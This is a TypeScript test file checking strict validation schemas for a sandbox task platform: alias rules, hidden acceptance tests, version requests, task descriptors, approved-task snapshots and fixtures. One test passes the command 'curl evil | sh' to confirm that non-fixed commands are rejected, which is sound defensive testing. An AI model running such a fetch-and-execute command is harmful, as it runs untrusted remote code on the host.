import assert from "node:assert/strict";
import { test } from "node:test";
import { SANDBOX_COMMANDS, SANDBOX_TOOLCHAIN } from "sandbox-factory";
import {
  acceptanceTestsSchema,
  aliasRuleSchema,
  approvedTaskSnapshotSchema,
  replayResponseSchema,
  sandboxVersionSourceDtoSchema,
  createSandboxVersionSchema,
  sandboxBuildParamsSchema,
  taskDescriptorSchema,
  updateSandboxVersionSchema,
  versionFixturesSchema,
} from "../src/index.js";

test("alias rules, hidden tests and version requests are strict and one-line where it matters", () => {
  assert.equal(
    aliasRuleSchema.safeParse({ before: "A", after: "B", kind: "identifier" })
      .success,
    true,
  );
  assert.equal(
    aliasRuleSchema.safeParse({ before: "A", after: "B", kind: "regex" })
      .success,
    false,
  );
  assert.equal(
    aliasRuleSchema.safeParse({
      before: "A",
      after: "B",
      kind: "path",
      paths: ["/abs"],
    }).success,
    false,
  );
  assert.equal(
    acceptanceTestsSchema.safeParse([
      { path: "tests/private/a.test.ts", text: "" },
      { path: "tests/private/a.test.ts", text: "" },
    ]).success,
    false,
  );
  assert.equal(
    acceptanceTestsSchema.safeParse([
      { path: "tests/public/a.test.ts", text: "" },
    ]).success,
    false,
  );
  const parsed = acceptanceTestsSchema.parse([
    { path: "tests/private/a.test.ts", text: "x" },
  ]);
  assert.equal(parsed[0]?.expectedBaseline, "pass");
  const version = createSandboxVersionSchema.parse({
    sliceRunId: "arn_1",
    title: "Fix it",
    specSummary: "Summary",
    complexity: "M",
  });
  assert.deepEqual(version.aliasRules, []);
  assert.deepEqual(version.tags, []);
  for (const bad of [
    {
      sliceRunId: "arn_1",
      title: " padded ",
      specSummary: "s",
      complexity: "M",
    },
    {
      sliceRunId: "arn_1",
      title: "two\nlines",
      specSummary: "s",
      complexity: "M",
    },
    {
      sliceRunId: "arn_1",
      title: "ok",
      specSummary: "s",
      complexity: "unsized",
    },
    {
      sliceRunId: "arn_1",
      title: "ok",
      specSummary: "s",
      complexity: "M",
      tags: ["a b\n"],
    },
  ])
    assert.equal(
      createSandboxVersionSchema.safeParse(bad).success,
      false,
      JSON.stringify(bad),
    );
  assert.equal(updateSandboxVersionSchema.safeParse({}).success, false);
  assert.equal(
    updateSandboxVersionSchema.safeParse({ title: "New" }).success,
    true,
  );
  assert.equal(
    sandboxBuildParamsSchema.safeParse({
      sliceRunId: "a",
      sandboxVersionId: "b",
      manifestSha256: "m".repeat(64),
      contractSha256: "a".repeat(64),
      transformConfigSha256: "a".repeat(64),
      approvedTaskSha256: "a".repeat(64),
    }).success,
    false,
  );
});

test("a task descriptor accepts only the fixed commands", () => {
  const descriptor = {
    schemaVersion: 1,
    sandboxId: "sbx_1",
    versionId: "sbv_1",
    version: 1,
    title: "Fix it",
    specSummary: "Summary",
    complexity: "M",
    tags: [],
    commands: SANDBOX_COMMANDS,
    toolchain: SANDBOX_TOOLCHAIN,
    editablePaths: ["src/app.ts"],
    publicTests: ["tests/public/spec.test.ts"],
    testSummary: [{ label: "public", count: 1 }],
  };
  assert.equal(taskDescriptorSchema.safeParse(descriptor).success, true);
  assert.equal(
    taskDescriptorSchema.safeParse({
      ...descriptor,
      commands: { ...SANDBOX_COMMANDS, test: "curl evil | sh" },
    }).success,
    false,
  );
  assert.equal(
    taskDescriptorSchema.safeParse({ ...descriptor, aliasRules: [] }).success,
    false,
  );
});

test("private provenance, the approved task and replay answers keep their exact shapes", () => {
  const stamp = "2026-10-03T00:00:00.000Z";
  const approvedTask = {
    schemaVersion: 2,
    title: "Fix it",
    summary: "Make it work.",
    spec: null,
    pricing: {
      proposalId: "bpr_1",
      proposalRevision: 2,
      complexity: "M",
      amountMinor: null,
      currency: null,
      status: "approved",
      decidedAt: stamp,
    },
    selectedBy: "user_1",
    selectedAt: stamp,
    ticketIds: ["tkt_1"],
  };
  assert.equal(
    approvedTaskSnapshotSchema.safeParse(approvedTask).success,
    true,
  );
  // A version frozen before tickets still reads, with its Jira pointers.
  const { ticketIds: _ticketIds, ...selection } = approvedTask;
  assert.equal(
    approvedTaskSnapshotSchema.safeParse({
      ...selection,
      schemaVersion: 1,
      jiraIssueIds: ["jri_1"],
    }).success,
    true,
  );
  // Each version has its own list, and no other.
  assert.equal(
    approvedTaskSnapshotSchema.safeParse({ ...approvedTask, schemaVersion: 1 })
      .success,
    false,
  );
  assert.equal(
    approvedTaskSnapshotSchema.safeParse({ ...approvedTask, schemaVersion: 3 })
      .success,
    false,
  );
  const source = {
    sandboxVersionId: "sbv_1",
    sourceSnapshotId: "rsn_1",
    sourceCommitSha: "a".repeat(40),
    sliceRunId: "arn_slice",
    manifestSha256: "m".repeat(64),
    contractSha256: "c".repeat(64),
    transformConfigSha256: "t".repeat(64),
    approvedTaskSha256: "p".repeat(64),
    aliasRules: [],
    dependencyChoices: { pg: "runtime-mock" },
    acceptanceTests: [],
    fixtures: null,
    approvedTask,
    scope: {
      editablePaths: ["src/app.ts"],
      generatedPaths: [],
      permittedOperations: ["edit"],
      dependencies: [],
      blockers: [],
    },
    harnessSha256: null,
    toolchainDigest: null,
    buildRunId: "arn_build",
    roundTripRunId: null,
    disclosureRunId: null,
    approvedBy: null,
    approvedAt: null,
    createdAt: stamp,
    updatedAt: stamp,
  };
  assert.equal(sandboxVersionSourceDtoSchema.safeParse(source).success, true);
  // Strict: nothing private beyond the listed fields leaves the API.
  assert.equal(
    sandboxVersionSourceDtoSchema.safeParse({ ...source, organizationId: "o" })
      .success,
    false,
  );
  assert.equal(
    sandboxVersionSourceDtoSchema.safeParse({ ...source, approvedAt: "today" })
      .success,
    false,
  );
  assert.equal(
    sandboxVersionSourceDtoSchema.safeParse({
      ...source,
      dependencyChoices: { pg: "vendor-it" },
    }).success,
    false,
  );
  assert.equal(
    replayResponseSchema.safeParse({
      ok: true,
      sourceSnapshotId: "rsn_1",
      sourceCommitSha: "a".repeat(40),
      sliceRunId: "arn_slice",
      manifestSha256: "m".repeat(64),
      transformConfigSha256: "t".repeat(64),
      approvedTaskSha256: "p".repeat(64),
      aliasRules: [],
    }).success,
    true,
  );
  assert.equal(
    replayResponseSchema.safeParse({
      ok: false,
      reason: "source_unavailable",
      detail: "The repository is gone.",
    }).success,
    true,
  );
  assert.equal(
    replayResponseSchema.safeParse({
      ok: false,
      reason: "use_main_instead",
      detail: "",
    }).success,
    false,
  );
});

test("versions copy fixtures from a run or take them written by hand, never both", () => {
  const fixture = {
    module: "src/db.ts",
    symbol: "db",
    member: "users.find",
    call: "call",
    implementation: "async (id) => ({ id })",
    reason: "a known user",
  };
  assert.equal(
    createSandboxVersionSchema.parse({
      sliceRunId: "s1",
      title: "Task",
      specSummary: "Summary",
      complexity: "M",
      fixtureRunId: "f1",
    }).fixtureRunId,
    "f1",
  );
  assert.equal(
    updateSandboxVersionSchema.safeParse({ fixtureRunId: null }).success,
    true,
  );
  assert.equal(
    updateSandboxVersionSchema.safeParse({
      fixtures: { fixtures: [fixture], scenario: "console.log(1);" },
    }).success,
    true,
  );
  assert.equal(
    updateSandboxVersionSchema.safeParse({
      fixtureRunId: "f1",
      fixtures: { fixtures: [], scenario: null },
    }).success,
    false,
  );
  assert.equal(
    updateSandboxVersionSchema.safeParse({
      fixtures: {
        fixtures: [{ ...fixture, call: "apply" }],
        scenario: null,
      },
    }).success,
    false,
  );
  assert.equal(
    versionFixturesSchema.safeParse({
      fixtureRunId: null,
      fixtures: [fixture],
      scenario: null,
    }).success,
    true,
  );
});
